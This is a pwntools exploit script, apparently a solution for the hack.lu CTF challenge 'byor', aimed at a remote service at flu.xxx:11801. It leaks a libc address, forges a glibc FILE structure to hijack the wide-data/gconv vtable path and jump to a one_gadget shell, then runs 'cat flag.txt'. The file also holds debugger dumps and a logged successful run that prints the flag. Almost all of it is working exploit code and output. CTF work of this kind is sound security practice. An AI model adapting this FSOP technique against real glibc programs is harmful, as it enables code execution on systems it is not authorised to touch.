#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template byor
from pwn import *



# Set up pwntools for the correct architecture
context.terminal = ["tmux", "splitw", "-h"]
exe = context.binary = ELF('byor')

#from pwnlib.libcdb import unstrip_libc
#print("UNSTRIPPING LIBC:", unstrip_libc('./libc.so.6')) #unstrip_libc(libc))

libc = ELF('./libc.so.6')  #`if (args.REMOTE) else ELF('/lib/x86_64-linux-gnu/libc.so.6')



# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote('flu.xxx', 11801)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw, api=True)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
set directories ./glibc-2.35/
breakrva 0x1257
continue
continue
'''.format(**locals())
##breakrva 0x1221

#gdbscript = '\n'.join(i for i in gdbscript if not i.startswith('#'))

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

# unbuffered stdout

io = start()

io.recvuntil(b"foundation: ")
stdout = io.recvline().strip()
log.debug(f"stdout leak: {stdout}")
libc.address = int(stdout, 16) - libc.sym["_IO_2_1_stdout_"]
log.success(f"libc @ {hex(libc.address)}")


vtable_pointer = libc.sym["__GI__IO_file_jumps"]
vtable_pointer = libc.sym["_IO_str_jumps"]
# vtable_pointer = libc.sym["_IO_helper_jumps"]

one_gadgets = list(map(int, '330295 330307 330328 330336 527427 527440 527445 527450 965873 965877 965880 1104834 1104842 1104847 1104857'.split()))
one_gadget = libc.address + one_gadgets[int(args.OG) if args.OG else 0]

exptected_len = 0xe0
payload  = b""
flags = 0xfbad2087 ^ 4
payload += p64(flags)                                   # flags
payload += p64(0x41414141)         # _IO_read_ptr
payload += p64(one_gadget)         # _IO_read_end
payload += p64(libc.sym["_IO_2_1_stdout_"]+131)         # _IO_read_base
payload += p64(libc.sym["_IO_2_1_stdout_"]+131)         # _IO_write_base
payload += p64(libc.sym["_IO_2_1_stdout_"]+131)         # _IO_write_ptr
payload += p64(libc.sym["_IO_2_1_stdout_"]+131)         # _IO_write_end
payload += p64(libc.sym["_IO_2_1_stdout_"]+131)         # _IO_buf_base
payload += p64(libc.sym["_IO_2_1_stdout_"]+132)         # _IO_buf_end
payload += p64(0x0)                                     # _IO_save_base
payload += p64(0x0)                                     # _IO_backup_base
payload += p64(0x0)                                     # _IO_save_end
payload += p64(0x0)                                     # _markers
payload += p64(libc.sym["_IO_2_1_stdin_"])              # _chain
payload += p64(0x1)                                     # _fileno | _flags2
payload += p64(0xffffffffffffffff)                      # _old_offset

# __gconv_step.__shlib_handle
payload += p64(0x0)                                     # _cur_column | _vtable_offset | _shortbuf[1] | 4-byte-hole
payload += p64(libc.sym["_IO_stdfile_1_lock"])          # _lock
payload += p64(0xffffffffffffffff)                      # _offset
payload += p64(libc.sym["_IO_2_1_stdout_"]+196)  # point to _unused2[20]                                    # _codecvt
# this will be overwritten by ptr returned from calloc(0xe0)
payload += p64(libc.sym["_IO_wide_data_1"])             # _wide_data

# __gconv_step.__fct
print("GADGET:", one_gadget)
payload += p64(libc.address+0x0000000000029e66 ) #: call rcx;  )                                     # _freeres_list
payload += p64(0x0)                                     # _freeres_buf
payload += p64(0x0)                                     # __pad5
payload += p32(0x0)                                     # _mode 4B

"""
pwndbg> ptype /o gs
type = struct __gconv_step {
/*      0      |       8 */    struct __gconv_loaded_object *__shlib_handle;
/*      8      |       8 */    const char *__modname;
/*     16      |       4 */    int __counter;
/* XXX  4-byte hole      */
/*     24      |       8 */    char *__from_name;
/*     32      |       8 */    char *__to_name;
/*     40      |       8 */    __gconv_fct __fct;
/*     48      |       8 */    __gconv_btowc_fct __btowc_fct;
/*     56      |       8 */    __gconv_init_fct __init_fct;
/*     64      |       8 */    __gconv_end_fct __end_fct;
/*     72      |       4 */    int __min_needed_from;
/*     76      |       4 */    int __max_needed_from;
/*     80      |       4 */    int __min_needed_to;
/*     84      |       4 */    int __max_needed_to;
/*     88      |       4 */    int __stateful;
/* XXX  4-byte hole      */
/*     96      |       8 */    void *__data;

                               /* total size (bytes):  104 */
                             } *
"""
#payload += p32(0x0) + p64(0) * 2                        # _unused2[20]
xyz = p64(libc.sym["_IO_2_1_stdout_"]+128)
xyz += b'\x00'*(20-len(xyz))
assert len(xyz) == 20
payload += xyz


# Exploitacja:
# &_IO_helper_jumps <--- tu mamy rozne VTABLE FILE*
# search -p &_IO_wfile_underflow => 0x7fefbd8e60e0
vtable_pointer = libc.address + 0x2160e0 - 0x38

payload += p64(vtable_pointer)
log.info(f"len(payload) = {hex(len(payload))}")

#io.gdb.execute('breakrva 0x1221')




io.sendline(payload)

if args.GDB:
    io.gdb.execute('break _IO_wfile_underflow')
    io.gdb.execute('continue')

io.sendline(b'cat flag.txt')
io.interactive()

# valid stdout
# pwndbg> tel 0x7f1f5bf0e780 0x1c
# 00:0000│ rax rsi r9 0x7f1f5bf0e780 (_IO_2_1_stdout_) ◂— 0xfbad2887
# 01:0008│            0x7f1f5bf0e788 (_IO_2_1_stdout_+8) —▸ 0x7f1f5bf0e803 (_IO_2_1_stdout_+131) ◂— 0xf107500000000000
# ... ↓               6 skipped
# 08:0040│            0x7f1f5bf0e7c0 (_IO_2_1_stdout_+64) —▸ 0x7f1f5bf0e804 (_IO_2_1_stdout_+132) ◂— 0x5bf1075000000000
# 09:0048│            0x7f1f5bf0e7c8 (_IO_2_1_stdout_+72) ◂— 0x0
# ... ↓               3 skipped
# 0d:0068│            0x7f1f5bf0e7e8 (_IO_2_1_stdout_+104) —▸ 0x7f1f5bf0daa0 (_IO_2_1_stdin_) ◂— 0xfbad2088
# 0e:0070│            0x7f1f5bf0e7f0 (_IO_2_1_stdout_+112) ◂— 0x1
# 0f:0078│            0x7f1f5bf0e7f8 (_IO_2_1_stdout_+120) ◂— 0xffffffffffffffff
# 10:0080│            0x7f1f5bf0e800 (_IO_2_1_stdout_+128) ◂— 0x0
# 11:0088│            0x7f1f5bf0e808 (_IO_2_1_stdout_+136) —▸ 0x7f1f5bf10750 (_IO_stdfile_1_lock) ◂— 0x0
# 12:0090│            0x7f1f5bf0e810 (_IO_2_1_stdout_+144) ◂— 0xffffffffffffffff
# 13:0098│            0x7f1f5bf0e818 (_IO_2_1_stdout_+152) ◂— 0x0
# 14:00a0│            0x7f1f5bf0e820 (_IO_2_1_stdout_+160) —▸ 0x7f1f5bf0d9a0 (_IO_wide_data_1) ◂— 0x0
# 15:00a8│            0x7f1f5bf0e828 (_IO_2_1_stdout_+168) ◂— 0x0
# ... ↓               2 skipped
# 18:00c0│            0x7f1f5bf0e840 (_IO_2_1_stdout_+192) ◂— 0xffffffff
# 19:00c8│            0x7f1f5bf0e848 (_IO_2_1_stdout_+200) ◂— 0x0
# 1a:00d0│            0x7f1f5bf0e850 (_IO_2_1_stdout_+208) ◂— 0x0
# 1b:00d8│            0x7f1f5bf0e858 (_IO_2_1_stdout_+216) —▸ 0x7f1f5bf0f580 (__GI__IO_file_jumps) ◂— 0x0
#
# 0xdad1b execve("/bin/sh", rbp-0x40, r13)
# one gadgets
# 0xdad1b execve("/bin/sh", rbp-0x40, r13)
# constraints:
#   address rbp-0x38 is writable
#   [rbp-0x40] == NULL || rbp-0x40 == NULL
#   [r13] == NULL || r13 == NULL
#
# 0xf7d82 posix_spawn(rsp+0x54, "/bin/sh", [rsp+0x30], 0, rsp+0x60, [rsp+0x160])
# constraints:
#   [rsp+0x60] == NULL
#   [[rsp+0x160]] == NULL || [rsp+0x160] == NULL
#   [rsp+0x30] == NULL || (s32)[[rsp+0x30]+0x4] <= 0
#
# 0xf7d8a posix_spawn(rsp+0x54, "/bin/sh", [rsp+0x30], 0, rsp+0x60, r9)
# constraints:
#   [rsp+0x60] == NULL
#   [r9] == NULL || r9 == NULL
#   [rsp+0x30] == NULL || (s32)[[rsp+0x30]+0x4] <= 0
#
# 0xf7d8f posix_spawn(rsp+0x54, "/bin/sh", rdx, 0, rsp+0x60, r9)
# constraints:
#   [rsp+0x60] == NULL
#   [r9] == NULL || r9 == NULL
#   rdx == NULL || (s32)[rdx+0x4] <= 0

"""
user@user:~/hacklu/pwn_byor/public$ python3 exploit.py REMOTE OG=6
[*] '/home/user/hacklu/pwn_byor/public/byor'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/user/hacklu/pwn_byor/public/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to flu.xxx on port 11801: Done
[+] libc @ 0x7f006de49000
GADGET: 139639820950613
[*] len(payload) = 0xe0
[*] Switching to interactive mode
flag{wh0_n33ds_w1de_dat4_vt4bl3s_4nyway5?}
[*] Got EOF while reading in interactive
"""
